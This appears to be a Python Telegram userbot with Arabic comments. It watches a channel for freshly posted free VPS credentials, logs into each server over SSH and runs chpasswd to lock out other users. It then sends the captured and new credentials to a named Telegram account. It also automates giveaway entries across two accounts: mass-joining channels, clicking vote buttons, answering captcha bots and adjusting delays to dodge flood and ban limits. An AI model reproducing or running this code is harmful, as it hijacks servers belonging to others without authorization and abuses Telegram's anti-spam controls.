#!/usr/bin/env python3
"""
■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
Omega Ultimate X – VPS Hunter + روليت متكامل + تغيير كلمة مرور SSH
لوحة تحكم حية | GitHub Actions 24/7 | يعمل على حسابين (اختياري)
■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
"""
import os, asyncio, random, re, time, logging, json, paramiko
from datetime import datetime, timedelta
from telethon import TelegramClient, events, Button, functions, types
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon.tl.functions.account import UpdateStatusRequest, UpdateProfileRequest
from telethon.errors import (
    FloodWaitError, UserBannedInChannelError, UserChannelsTooMuchError,
    ChannelsTooMuchError, PeerFloodError, AuthKeyDuplicatedError
)

# ---------- تسجيل ----------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('omega_ultimate_x.log'), logging.StreamHandler()]
)
logger = logging.getLogger("OmegaUltimateX")

# ---------- الإعدادات (أسرار GitHub) ----------
API_ID_1 = int(os.environ["API_ID_1"]); API_HASH_1 = os.environ["API_HASH_1"]; SESSION_1 = os.environ["SESSION_1"]
API_ID_2 = int(os.environ.get("API_ID_2", 0)); API_HASH_2 = os.environ.get("API_HASH_2", ""); SESSION_2 = os.environ.get("SESSION_2", "")
ADMIN_ID = int(os.environ["ADMIN_ID"])
TARGET_VPS_CHANNEL = "FreeinternetTM"
NOTIFY_USER = "KOA_7"  # بدون @

# إعدادات SSH (لتغيير كلمة المرور تلقائياً)
NEW_VPS_PASSWORD = os.environ.get("NEW_VPS_PASSWORD", "Omega@2026!")  # كلمة مرور جديدة لقفل الـ VPS

# كلمات الصيد
HUNT_BUTTONS = ["مشاركة", "انضمام", "سحب", "تدوير", "دخول", "تأكيد", "اضغط هنا", "سجل"]
VOTE_BUTTONS = ["❤️", "👍", "تصويت", "يستحق", "صوت"]
DANGER_WORDS = ["أكثر نجوم", "من يضع", "تصويت بنجوم", "اكثر شخص يحط", "يحط يربح", "مزاد نجوم"]
SAFE_CONTEST_REGEX = r'أول\s*(شخص|واحد|من)\s*(ي|يلي)?\s*(كتب|يكتب|قال|يقول|رد|يرد|علق|يعلق)\s*[({\[].*?[)}\]]'

# ملفات
LEARNING_FILE = "omega_memory.json"
STATS_MSG_ID = None

class OmegaUltimateX:
    def __init__(self):
        self.c1 = TelegramClient(StringSession(SESSION_1), API_ID_1, API_HASH_1)
        self.c2 = TelegramClient(StringSession(SESSION_2), API_ID_2, API_HASH_2) if SESSION_2 else None
        self.running = True
        self.stats = {
            "vps_captured": 0, "passwords_changed": 0,
            "wins": 0, "channels_left": 0,
            "start": time.time()
        }
        self.cache = set()
        self.active_tasks = set()
        self.memory = self.load_memory()
        self.main_client = None

    # ---------- ذاكرة ----------
    def load_memory(self):
        try:
            with open(LEARNING_FILE, 'r') as f: return json.load(f)
        except: return {"delay_multiplier": 1.0, "bad_channels": []}
    def save_memory(self):
        with open(LEARNING_FILE, 'w') as f: json.dump(self.memory, f, indent=2)
    async def learn(self, err, cid=None):
        if isinstance(err, FloodWaitError):
            self.memory['delay_multiplier'] = min(3.0, self.memory['delay_multiplier']+0.1)
        elif isinstance(err, (UserBannedInChannelError, PeerFloodError)) and cid:
            self.memory['bad_channels'].append(cid)
        self.save_memory()

    def get_delay(self): return random.uniform(1.5*self.memory['delay_multiplier'], 4.0*self.memory['delay_multiplier'])

    # ---------- اتصال ----------
    async def connect(self, client, name):
        for _ in range(3):
            try:
                await client.connect()
                if await client.is_user_authorized():
                    logger.info(f"✅ {name}")
                    return True
            except AuthKeyDuplicatedError: logger.critical(f"🔑 {name} جلسة مكررة!"); break
            except Exception as e: logger.error(f"❌ {name}: {e}")
            await asyncio.sleep(10)
        return False

    async def keep_alive(self, client, name):
        while self.running:
            try:
                if not client.is_connected(): await client.connect()
                await client(UpdateStatusRequest(offline=False))
            except: pass
            await asyncio.sleep(120)

    # ---------- لوحة تحكم حية ----------
    async def live_stats(self):
        global STATS_MSG_ID
        while self.running:
            if self.main_client:
                uptime = str(timedelta(seconds=int(time.time()-self.stats['start'])))
                msg = (
                    f"📊 **Omega Ultimate X**\n"
                    f"🕒 {datetime.now().strftime('%H:%M:%S')}\n"
                    f"⏱️ {uptime}\n"
                    f"🌐 VPS: {self.stats['vps_captured']} | 🔑 مغير: {self.stats['passwords_changed']}\n"
                    f"🏆 روليت: {self.stats['wins']} | 🚪 مغادرة: {self.stats['channels_left']}\n"
                    f"🟢 الحالة: {'يعمل' if self.running else 'متوقف'}"
                )
                try:
                    if STATS_MSG_ID:
                        await self.main_client.edit_message('me', STATS_MSG_ID, msg)
                    else:
                        sent = await self.main_client.send_message('me', msg)
                        STATS_MSG_ID = sent.id
                except: pass
            await asyncio.sleep(5)  # تحديث كل 5 ثواني

    # ---------- وظيفة SSH لتغيير كلمة المرور ----------
    async def change_vps_password(self, ip, user, old_pwd):
        """يتصل بالـ VPS ويغير كلمة المرور باستخدام paramiko"""
        try:
            # محاولة الاتصال عبر SSH
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            await asyncio.get_event_loop().run_in_executor(
                None, ssh.connect, ip, 22, user, old_pwd, {'timeout': 15}
            )
            # أمر تغيير كلمة المرور (لنظام Linux)
            cmd = f"echo '{user}:{NEW_VPS_PASSWORD}' | chpasswd"
            await asyncio.get_event_loop().run_in_executor(
                None, lambda: ssh.exec_command(cmd, timeout=10)
            )
            ssh.close()
            return True
        except Exception as e:
            logger.warning(f"فشل تغيير كلمة مرور {ip}: {e}")
            return False

    # ---------- مراقبة VPS ----------
    async def vps_watcher(self, event):
        text = event.raw_text or ""
        # استخراج البيانات
        ip = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
        user = re.search(r'(?:User[:\s]*|👤\s*User[:\s]*)(\S+)', text, re.I)
        pwd = re.search(r'(?:password[:\s]*|🔐\s*New password[:\s]*)(\S+)', text, re.I)

        if ip and pwd:
            ip_val = ip.group(1)
            user_val = user.group(1) if user else "root"
            pwd_val = pwd.group(1)

            self.stats['vps_captured'] += 1

            # محاولة تغيير كلمة المرور تلقائياً
            changed = await self.change_vps_password(ip_val, user_val, pwd_val)
            if changed:
                self.stats['passwords_changed'] += 1
                extra_msg = f"\n🔒 **تم تغيير كلمة المرور!** الكلمة الجديدة: `{NEW_VPS_PASSWORD}`"
            else:
                extra_msg = "\n⚠️ تعذر تغيير كلمة المرور تلقائياً."

            # إرسال إلى المستخدم
            msg = (
                f"🔥 **VPS جديد!**\n"
                f"▪️ IP: `{ip_val}`\n"
                f"▪️ User: `{user_val}`\n"
                f"▪️ Pass (قديم): `{pwd_val}`{extra_msg}"
            )
            try:
                await self.main_client.send_message(
                    NOTIFY_USER, msg,
                    buttons=[
                        [Button.inline("📋 نسخ IP", f"copy_{ip_val}"),
                         Button.inline("📋 نسخ كلمة المرور القديمة", f"copy_{pwd_val}")]
                    ]
                )
            except: pass

    # ---------- عمليات القنوات ----------
    async def leave_oldest_channels(self, client):
        dialogs = await client.get_dialogs()
        channels = [d for d in dialogs if d.is_channel]
        channels.sort(key=lambda d: d.date or datetime.min)
        left = 0
        for d in channels[:5]:
            try:
                await client(LeaveChannelRequest(d.entity))
                left += 1; await asyncio.sleep(2)
            except: pass
        self.stats['channels_left'] += left
        return left > 0

    async def safe_join(self, client, entity):
        delay = random.randint(8, 18)
        await asyncio.sleep(delay)
        try:
            await client(JoinChannelRequest(entity))
            return True
        except (UserChannelsTooMuchError, ChannelsTooMuchError):
            if await self.leave_oldest_channels(client):
                await asyncio.sleep(3)
                try: await client(JoinChannelRequest(entity)); return True
                except: pass
        except: pass
        return False

    async def handle_captcha_bot(self, client, bot_username):
        try:
            await client.send_message(bot_username, "/start")
            await asyncio.sleep(3)
            msgs = await client.get_messages(bot_username, limit=2)
            for msg in msgs:
                if msg.reply_markup:
                    text = msg.text or ""
                    emoji = re.search(r'\((.*?)\)', text)
                    if emoji:
                        target = emoji.group(1).strip()
                        for r,row in enumerate(msg.reply_markup.rows):
                            for b,btn in enumerate(row.buttons):
                                if target in btn.text:
                                    await msg.click(r,b); return True
                    else:
                        await msg.click(0,0); return True
        except: pass
        return False

    # ---------- معالج الروليت المعقد ----------
    async def process_roulette(self, event, client):
        if event.id in self.active_tasks: return
        self.active_tasks.add(event.id)

        text = event.raw_text or ""
        if any(w in text for w in DANGER_WORDS): return

        # مسابقة آمنة "أول شخص يكتب"
        safe = re.search(SAFE_CONTEST_REGEX, text, re.I)
        if safe:
            reply = re.search(r'[({\[].*?[)}\]]', text)
            reply_text = reply.group(0).strip('(){}[]') if reply else "تم"
            try: await event.reply(reply_text)
            except: pass
            if event.reply_markup: await self.click_hunt(event, client)
            return

        if not event.reply_markup: return

        # البحث عن روابط التوجيه
        redirect_urls = []
        for row in event.reply_markup.rows:
            for btn in row.buttons:
                if btn.url and 't.me' in btn.url:
                    redirect_urls.append((btn, row.row_index, btn.column_index))

        for btn, r_idx, b_idx in redirect_urls:
            if any(k in btn.text for k in HUNT_BUTTONS) or 'هنا' in btn.text:
                match = re.search(r't\.me/([\w_]+)/(\d+)', btn.url)
                if match:
                    ch = match.group(1); msg_id = int(match.group(2))
                    await self.safe_join(client, ch)
                    try:
                        vote_msg = await client.get_messages(ch, ids=msg_id)
                        if vote_msg and vote_msg.reply_markup:
                            for vr, vrow in enumerate(vote_msg.reply_markup.rows):
                                for vb, vbtn in enumerate(vrow.buttons):
                                    if any(vk in vbtn.text for vk in VOTE_BUTTONS) or not vbtn.text:
                                        await vote_msg.click(vr, vb)
                                        await asyncio.sleep(2)
                                        if vbtn.url and 't.me' in vbtn.url:
                                            bot_match = re.search(r't\.me/([\w_]+bot)', vbtn.url, re.I)
                                            if bot_match: await self.handle_captcha_bot(client, bot_match.group(1))
                    except: pass
                    # العودة للزر الأصلي
                    try:
                        orig = await client.get_messages(event.chat_id, ids=event.id)
                        await orig.click(r_idx, b_idx)
                        self.stats['wins'] += 1
                    except: pass
                return

        # إذا لم تكن هناك روابط توجيه، روليت عادي
        if event.id in self.cache: return
        if any(k in (text + " ".join([b.text for r in event.reply_markup.rows for b in r.buttons])).lower() for k in HUNT_BUTTONS):
            self.cache.add(event.id)
            # الانضمام للقنوات المذكورة في النص
            links = re.findall(r't\.me/[\w\d_]+|@[\w\d_]+', text)
            for l in links:
                name = l.split('/')[-1].replace('@','')
                try: await client(JoinChannelRequest(name))
                except: pass
            await asyncio.sleep(self.get_delay())
            await self.click_hunt(event, client)

    async def click_hunt(self, event, client):
        if not event.reply_markup: return
        chat_id = event.chat_id
        for r,row in enumerate(event.reply_markup.rows):
            for b,btn in enumerate(row.buttons):
                if any(k in btn.text for k in HUNT_BUTTONS) or "مشاركة" in btn.text:
                    try:
                        await event.click(r,b)
                        self.stats['wins'] += 1
                        return
                    except FloodWaitError as e: await self.learn(e); await asyncio.sleep(e.seconds+1)
                    except (UserBannedInChannelError, PeerFloodError) as e:
                        await self.learn(e, chat_id)
                        try: await client(LeaveChannelRequest(chat_id))
                        except: pass
                    except: pass
        # زر شفاف احتياطي
        try: await event.click(0,0); self.stats['wins'] += 1
        except: pass

    # ---------- أوامر ----------
    async def handle_command(self, event, parts):
        cmd = parts[0][1:].lower()
        if cmd == "stop": self.running = False; await event.reply("🛑 توقف")
        elif cmd == "start": self.running = True; await event.reply("✅ تشغيل")
        elif cmd == "stats": await event.reply("📊 جاري تحديث اللوحة...")
        elif cmd == "leavedead":
            for client in [self.c1] if not self.c2 else [self.c1, self.c2]:
                async for d in client.iter_dialogs():
                    if d.is_channel:
                        try:
                            msgs = await client.get_messages(d.entity, limit=1)
                            if not msgs or not msgs[0].date: await client(LeaveChannelRequest(d.entity))
                        except: pass
            await event.reply("🧹 تم تنظيف القنوات الميتة")
        elif cmd == "panel":
            btns = [[Button.inline(".stats", b"copy_stats"), Button.inline(".stop", b"copy_stop")]]
            await event.respond("🔥 **Omega Ultimate X**", buttons=btns)

    # ---------- تشغيل ----------
    async def main(self):
        if not await self.connect(self.c1, "حساب 1"): return
        self.main_client = self.c1
        if self.c2 and not await self.connect(self.c2, "حساب 2"): self.c2 = None

        # مستمع الـ VPS
        @self.c1.on(events.NewMessage(chats=TARGET_VPS_CHANNEL))
        async def vps_handler(event): await self.vps_watcher(event)

        # مستمع الروليت
        @self.c1.on(events.NewMessage())
        async def r1(event):
            if event.sender_id == ADMIN_ID and event.raw_text.startswith("."):
                await self.handle_command(event, event.raw_text.split())
            elif event.is_channel or event.is_group:
                await self.process_roulette(event, self.c1)

        if self.c2:
            @self.c2.on(events.NewMessage())
            async def r2(event):
                if event.is_channel or event.is_group:
                    await self.process_roulette(event, self.c2)

        # أزرار النسخ
        @self.c1.on(events.CallbackQuery)
        async def cb(event):
            if event.data.decode().startswith("copy_"):
                await event.answer("✅ تم النسخ")

        # مهام خلفية
        asyncio.create_task(self.keep_alive(self.c1, "ح1"))
        if self.c2: asyncio.create_task(self.keep_alive(self.c2, "ح2"))
        asyncio.create_task(self.live_stats())  # لوحة التحكم الحية

        await self.c1(UpdateStatusRequest(offline=False))
        logger.info("🚀 Omega Ultimate X يعمل")
        await self.c1.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(OmegaUltimateX().main())
